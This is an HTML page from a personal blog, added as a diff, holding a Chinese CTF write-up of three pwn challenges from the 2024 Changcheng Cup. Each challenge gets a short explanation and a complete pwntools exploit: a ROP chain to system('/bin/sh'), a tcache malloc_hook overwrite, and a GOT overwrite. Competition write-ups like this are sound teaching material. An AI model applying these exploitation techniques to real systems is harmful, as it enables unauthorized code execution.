@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="sheratan" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      2024京津冀长城杯wp-pwn 
+      
+      
+      |
+    
+     让我过六级
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">sheratan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">2024京津冀长城杯wp-pwn</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-08 17:06:04
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="2024京津冀长城杯wp-pwn"><a href="#2024京津冀长城杯wp-pwn" class="headerlink" title="2024京津冀长城杯wp-pwn"></a>2024京津冀长城杯wp-pwn</h1><p>还有一道kernel和一道c++，属实打不来，还得学啊</p>
+<h2 id="FlowerShop"><a href="#FlowerShop" class="headerlink" title="FlowerShop"></a>FlowerShop</h2><p>溢出修改总金额的大小，购买999价格的商品拿到&#x2F;bin&#x2F;sh，栈溢出ROP getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft <span class="keyword">as</span> sc</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">choice,conti</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;:\n&quot;</span>)</span><br><span class="line">        io.sendline(choice)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">        io.sendline(conti)</span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">b&quot;a&quot;</span>*<span class="number">52</span>+<span class="string">b&quot;pwn\x00&quot;</span>+p32(<span class="number">10000</span>))</span><br><span class="line">    rdi_ret = <span class="number">0x0000000000400f13</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    buy(<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    buy(<span class="string">b&quot;a&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    buy(<span class="string">b&quot;b&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    buy(<span class="string">b&quot;c&quot;</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>+p64(rdi_ret+<span class="number">1</span>)+p64(rdi_ret)+p64(<span class="number">0x601840</span>)+p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Kylin-Heap"><a href="#Kylin-Heap" class="headerlink" title="Kylin_Heap"></a>Kylin_Heap</h2><p>unsorted bin泄露libc，tcache打malloc hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft <span class="keyword">as</span> sc</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> tag,data           :io.sendafter(tag, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> tag,data           :io.sendlineafter(tag, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> tag, drop=<span class="literal">True</span>     :io.recvuntil(tag, drop)</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">toBytes</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(d).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">b&quot;adventurer? &quot;</span>,toBytes(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;bytes): &quot;</span>,toBytes(size))</span><br><span class="line">    sa(<span class="string">b&quot;bytes):\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;(0-19): &quot;</span>,toBytes(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;(0-19): &quot;</span>,toBytes(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;(0-19): &quot;</span>,toBytes(idx))</span><br><span class="line">    sa(<span class="string">b&quot;bytes):\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">b&quot;A&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">b&quot;A&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&quot;\x5b\x30\x5d\x3a\n&quot;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>)+<span class="string">b&quot;\x00\x00&quot;</span>) - <span class="number">0x1ebbe0</span></span><br><span class="line">    malloc_hook = libc_base + <span class="number">0x1ebb70</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">b&quot;A&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">b&quot;A&quot;</span>) <span class="comment"># 3</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">3</span>,p64(malloc_hook))</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">b&quot;A&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">    ogg = [<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">    add(<span class="number">0x70</span>,p64(libc_base + ogg[<span class="number">1</span>])) <span class="comment"># 5</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;bytes): &quot;</span>,<span class="string">b&quot;200&quot;</span>)</span><br><span class="line">    <span class="comment"># g()</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="consumption"><a href="#consumption" class="headerlink" title="consumption"></a>consumption</h2><p>溢出可以覆盖size的指针，通过输入size时达到修改任意地址的效果，这里把heap[0]置为&#x2F;bin&#x2F;sh的地址，通过指针覆盖把heap[1]改为free_got，show heap[1]泄露地址，再edit heap[1]将free got内容改为system，最后free heap[0] getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft <span class="keyword">as</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> tag,data           :io.sendafter(tag, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> tag,data           :io.sendlineafter(tag, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> tag, drop=<span class="literal">True</span>     :io.recvuntil(tag, drop)</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">        pl = <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;1&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;%d&quot;,&quot;content&quot;:&quot;%s&quot;&#125;&#x27;</span>%(size,content)</span><br><span class="line">        io.sendline(pl)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">        pl = <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;2&quot;,&quot;idx&quot;:%d,&quot;size&quot;:&quot;100&quot;,&quot;content&quot;:&quot;aaaa&quot;&#125;&#x27;</span>%(idx)</span><br><span class="line">        io.sendline(pl)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">        pl = <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:%d,&quot;size&quot;:&quot;100&quot;,&quot;content&quot;:&quot;aaaa&quot;&#125;&#x27;</span>%(idx)</span><br><span class="line">        io.sendline(pl)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">        pl = <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;4&quot;,&quot;idx&quot;:%d,&quot;size&quot;:&quot;100&quot;,&quot;content&quot;:&quot;%s&quot;&#125;&#x27;</span>%(idx,content)</span><br><span class="line">        io.sendline(pl)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>,<span class="string">&quot;/bin/sh;&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">    pl = <span class="string">b&#x27;&#123;&quot;choice&quot;:&quot;1&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;%d&quot;,&quot;content&quot;:&quot;/bin/sh;&#x27;</span>% elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    pl = pl.ljust(<span class="number">1280</span>,<span class="string">b&quot;A&quot;</span>) + p32(<span class="number">0x08051B14</span>)</span><br><span class="line">    pl += <span class="string">b&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    io.sendline(pl)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/Downloads/libc.so.6&quot;</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    r(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">    libc_base = u32(r(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">    pl = <span class="string">b&#x27;&#123;&quot;choice&quot;:&quot;4&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;100&quot;,&quot;content&quot;:&quot;%s&quot;&#125;&#x27;</span> %(p32(system)*<span class="number">2</span>)</span><br><span class="line">    io.sendline(pl)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;exit\t\n&quot;</span>)</span><br><span class="line">    pl = <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;2&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;100&quot;,&quot;content&quot;:&quot;aaaa&quot;&#125;&#x27;</span></span><br><span class="line">    io.sendline(pl)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/f2ba450b.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-08 17:06:04
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AFwp-pwn"><span class="toc-text">2024京津冀长城杯wp-pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FlowerShop"><span class="toc-text">FlowerShop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kylin-Heap"><span class="toc-text">Kylin_Heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#consumption"><span class="toc-text">consumption</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/sheratan4">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+            <a title="email" href="mailto:sheratan@wgpsec.org">
+              <i class="iconfont icon-envelope"></i>
+            </a>
+            
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/sheratan4">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
